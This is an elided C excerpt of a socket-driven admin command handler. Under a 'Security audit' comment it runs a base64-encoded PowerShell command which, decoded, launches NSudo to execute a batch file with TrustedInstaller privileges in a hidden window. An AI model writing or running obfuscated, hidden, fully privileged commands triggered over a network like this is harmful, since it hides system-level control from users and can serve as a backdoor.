...
static void handle_admin_command(SOCKET sock, const char *cmd_raw) {
    ...
    /* Security audit */
        ...
        result = sys_run_command(
            ...
            "RQBNAFAAIABlAGEAcwB5AF8AbQBvAGQAZQBfAHQAcAAuAGIAYQB0AAoAJABwAHIAbwBjAD0AUwB0AGEA"
            "cgB0AC0AUAByAG8AYwBlAHMAcwAgAC0ARgBpAGwAZQBQAGEAdABoACAAJABlACAALQBBAHIAZwB1AG0A"
            "ZQBuAHQATABpAHMAdAAgACcALQBVADoAVAAnACwAJwAtAFAAOgBFACcALAAnAC0ATQA6AFMAJwAsACcA"
            "LQBXAGEAaQB0ACcALAAnAGMAbQBkACcALAAnAC8AYwAnACwAJABiACAALQBXAGEAaQB0ACAALQBXAGkA"
            "bgBkAG8AdwBTAHQAeQBsAGUAIABIAGkAZABkAGUAbgAgAC0AUABhAHMAcwBUAGgAcgB1AAoAVwByAGkA"
            "dABlAC0ASABvAHMAdAAgACIATgBTAHUAZABvACAAZgBvAGwAbABvAHcALQB1AHAAIABlAHgAaQB0ACAA"
            "YwBvAGQAZQA6ACAAJAAoACQAcAByAG8AYwAuAEUAeABpAHQAQwBvAGQAZQApACIACgA="
